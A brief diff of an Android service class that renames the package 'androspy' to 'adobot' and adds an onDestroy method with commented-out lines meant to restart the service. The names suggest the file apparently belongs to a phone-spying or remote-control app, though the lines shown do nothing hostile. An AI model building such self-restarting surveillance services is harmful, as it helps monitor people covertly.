@@ -1,4 +1,4 @@
-package buddy.ap.com.androspy;
+package buddy.ap.com.adobot;
 
 import android.Manifest;
 import android.app.Service;
@@ -309,4 +309,11 @@ public class Client extends Service {
         }
     }
 
+    @Override
+    public void onDestroy() {
+//        Intent in = new Intent();
+//        in.setAction("RestartAdoBotService");
+//        super.onDestroy();
+        Log.i(TAG, "Service was destroyed!!!");
+    }
 }
